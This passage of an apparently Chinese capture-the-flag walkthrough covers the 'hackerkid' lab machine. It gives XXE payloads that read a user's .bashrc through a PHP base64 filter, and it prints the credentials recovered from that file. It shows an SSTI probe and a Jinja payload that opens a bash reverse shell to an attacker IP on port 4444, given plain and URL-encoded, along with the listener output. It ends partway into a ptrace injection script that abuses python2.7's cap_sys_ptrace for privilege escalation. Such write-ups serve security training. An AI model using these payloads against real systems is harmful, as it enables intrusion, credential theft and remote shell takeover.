+<h3 id="可登录账号"><a href="#可登录账号" class="headerlink" title="可登录账号"></a>可登录账号</h3><p>通过搜索/bin/bash，可以确定哪些账号可以通过ssh登录，如下，可以确定root和saket。</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/21.jpg"></p>
+<h3 id="php封装器读取bashrc"><a href="#php封装器读取bashrc" class="headerlink" title="php封装器读取bashrc"></a>php封装器读取bashrc</h3><p>尝试读取了很多文件，但是只用/home/saket/.bashrc比较有用。</p>
+<p>这里直接读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;file:///home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有读取到，需要用php的base64封装器读取</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/22.jpg"></p>
+<p>读取成功，解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span></span><br><span class="line"><span class="comment"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span></span><br><span class="line"><span class="comment"># for examples</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If not running interactively, don&#x27;t do anything</span></span><br><span class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) <span class="built_in">return</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># don&#x27;t put duplicate lines or lines starting with space in the history.</span></span><br><span class="line"><span class="comment"># See bash(1) for more options</span></span><br><span class="line">HISTCONTROL=ignoreboth</span><br><span class="line"></span><br><span class="line"><span class="comment"># append to the history file, don&#x27;t overwrite it</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"></span><br><span class="line"><span class="comment"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span></span><br><span class="line">HISTSIZE=1000</span><br><span class="line">HISTFILESIZE=2000</span><br><span class="line"></span><br><span class="line"><span class="comment"># check the window size after each command and, if necessary,</span></span><br><span class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></span><br><span class="line"><span class="built_in">shopt</span> -s checkwinsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># If set, the pattern &quot;**&quot; used in a pathname expansion context will</span></span><br><span class="line"><span class="comment"># match all files and zero or more directories and subdirectories.</span></span><br><span class="line"><span class="comment">#shopt -s globstar</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make less more friendly for non-text input files, see lesspipe(1)</span></span><br><span class="line">[ -x /usr/bin/lesspipe ] &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(SHELL=/bin/sh lesspipe)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;debian_chroot:-&#125;</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    xterm-color|*-256color) color_prompt=yes;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span></span><br><span class="line"><span class="comment"># off by default to not distract the user: the focus in a terminal window</span></span><br><span class="line"><span class="comment"># should be on the output of commands, not on the prompt</span></span><br><span class="line"><span class="comment">#force_color_prompt=yes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$force_color_prompt</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="keyword">then</span></span><br><span class="line">	<span class="comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span></span><br><span class="line">	<span class="comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span></span><br><span class="line">	<span class="comment"># a case would tend to support setf rather than setaf.)</span></span><br><span class="line">	color_prompt=yes</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	color_prompt=</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$color_prompt</span>&quot;</span> = yes ]; <span class="keyword">then</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PS1=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1=<span class="string">&quot;\[\e]0;<span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>\u@\h: \w\a\]<span class="variable">$PS1</span>&quot;</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable color support of ls and also add handy aliases</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b)</span>&quot;</span></span><br><span class="line">    <span class="built_in">alias</span> ls=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias dir=&#x27;dir --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> fgrep=<span class="string">&#x27;fgrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> egrep=<span class="string">&#x27;egrep --color=auto&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># colored GCC warnings and errors</span></span><br><span class="line"><span class="comment">#export GCC_COLORS=&#x27;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some more ls aliases</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add an &quot;alert&quot; alias for long running commands.  Use like so:</span></span><br><span class="line"><span class="comment">#   sleep 10; alert</span></span><br><span class="line"><span class="built_in">alias</span> alert=<span class="string">&#x27;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#x27;</span>\<span class="string">&#x27;&#x27;</span>s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;)&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias definitions.</span></span><br><span class="line"><span class="comment"># You may want to put all your additions into a separate file like</span></span><br><span class="line"><span class="comment"># ~/.bash_aliases, instead of adding them here directly.</span></span><br><span class="line"><span class="comment"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable programmable completion features (you don&#x27;t need to enable</span></span><br><span class="line"><span class="comment"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span></span><br><span class="line"><span class="comment"># sources /etc/bash.bashrc).</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f /usr/share/bash-completion/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  <span class="keyword">elif</span> [ -f /etc/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Setting Password for running python app</span></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;Saket!#$%@!!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现账号密码</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">&quot;Saket!#$%@!!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用该账号登录9999端口，没有成功将admin换成saket成功登录saket/Saket!#$%@!!</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/23.jpg"></p>
+<p>登录后发现没有啥内容，根据提示猜测有name参数。</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/24.jpg"></p>
+<h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><p>观察该页面，通过输入的参数在页面输出到对应的位置，很简单，也许就是一个模板页面，尝试SSTI模板注入。</p>
+<ul>
+<li><strong>通用探测payload1</strong></li>
+</ul>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">1</span>+abcxyz&#125;&#125;</span><span class="xml">$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/25.jpg"></p>
+<p>如果看到错误，并且返回结果里有我们随便定义的服务端不存在的字符串<code>abcxyz</code>，那很有可能是模板触发的报错，可能存在模板注入漏洞。<strong>返回结果可以判断是python的模板</strong>。</p>
+<ul>
+<li><strong>通用探测payload2</strong></li>
+</ul>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">$&#123;7*7&#125;,</span><span class="template-variable">&#123;&#123;<span class="name">7</span>*<span class="number">7</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/26.jpg"></p>
+<p>可以确定是双层的payload执行了49</p>
+<p>也就是如下url就行了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>hackerkid.blackhat.local:<span class="number">9999</span>/?name=<span class="variable">$&#123;&#123;7*7&#125;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p><strong>注入反弹shell的代码</strong></p>
+<p>发现报错</p>
+</li>
+</ul>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% import os %&#125;</span><span class="template-variable">&#123;&#123;<span class="name">os.system</span>(<span class="name">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.16.42.147/4444 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/27.jpg"></p>
+<p><strong>这是模板注入通常会遇到的异常情况</strong>。我们需要做一些编码，混淆，绕过等。</p>
+<p>这里我们所有的字符都进行ascii编码，包括<code>&#125;</code>、<code>%</code>、<code>&#123;</code>、<code>&#39;</code>、<code>&quot;</code>、空格等字符</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/28.jpg"> </p>
+<p>我们这里直接使用CyberChef进行编码</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/29.jpg"> </p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">7</span>B<span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">20</span>import<span class="meta">%</span><span class="number">20</span>os<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">25</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">7</span>B<span class="meta">%</span><span class="number">7</span>Bos<span class="meta">%</span><span class="number">2</span>Esystem<span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">27</span>bash<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Dc<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">22</span>bash<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Di<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span><span class="number">26</span><span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">2</span>Fdev<span class="meta">%</span><span class="number">2</span>Ftcp<span class="meta">%</span><span class="number">2</span>F<span class="number">172</span><span class="meta">%</span><span class="number">2</span>E<span class="number">16</span><span class="meta">%</span><span class="number">2</span>E<span class="number">42</span><span class="meta">%</span><span class="number">2</span>E<span class="number">147</span><span class="meta">%</span><span class="number">2</span>F<span class="number">4444</span><span class="meta">%</span><span class="number">200</span><span class="meta">%</span><span class="number">3</span>E<span class="meta">%</span><span class="number">261</span><span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">27</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">7</span>D<span class="meta">%</span><span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹了shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line">connect to [172.16.42.147] from (UNKNOWN) [172.16.42.207] 55092</span><br><span class="line">bash: cannot set terminal process group (650): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">saket@ubuntu:~$</span><br><span class="line">saket@ubuntu:~$</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Capabilities权限提升"><a href="#Capabilities权限提升" class="headerlink" title="Capabilities权限提升"></a>Capabilities权限提升</h2><p>Capabilities是内核的一个功能，用来做权限管理。它将系统的特权分成了四十多个权限组。比如wireshark在Linux上如果不是root就不能直接执行，需要添加对应的Capabilites权限<code>setcap cap_net_raw,cap_net_admin=eip /user/bin/dumpcap</code>。</p>
+<p>可以通过官方文档了解Capabilites：<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p>
+<ul>
+<li><p><strong>递归查询系统所有的Capabilities权限文件，并且将标准错误输出到/dev/null</strong></p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">saket<span class="meta">@ubuntu</span>:~$ getcap -r / <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">getcap -r / <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果为空，单独执行getcap，发现是没有环境变量，那么我们指定路径</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">saket<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>getcap</span><br><span class="line">getcap</span><br><span class="line">Command <span class="string">&#x27;getcap&#x27;</span> is available <span class="keyword">in</span> the following places</span><br><span class="line"> * <span class="regexp">/sbin/getcap</span></span><br><span class="line"> * <span class="regexp">/usr/sbin</span><span class="regexp">/getcap</span></span><br></pre></td></tr></table></figure>
+
+<p>执行指令<code>/sbin/getcap -r / 2&gt;/dev/null</code></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:~$ <span class="regexp">/sbin/g</span>etcap -r <span class="regexp">/ 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/sbin/g</span>etcap -r <span class="regexp">/ 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/snap/</span>core20<span class="regexp">/1695/u</span>sr<span class="regexp">/bin/</span>ping = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/python2.<span class="number">7</span> = cap_sys_ptrace+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/ping = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/gnome-keyring-daemon = cap_ipc_lock+ep</span><br><span class="line"><span class="regexp">/usr/</span>bin/mtr-packet = cap_net_raw+ep</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/x86_64-linux-gnu/g</span>streamer1.<span class="number">0</span><span class="regexp">/gstreamer-1.0/g</span>st-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure>
+
+<p>发现python2.7具有cap_sys_ptrace权限。这是可以提权的。</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT   = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS    = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS    = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH     = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH     = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span 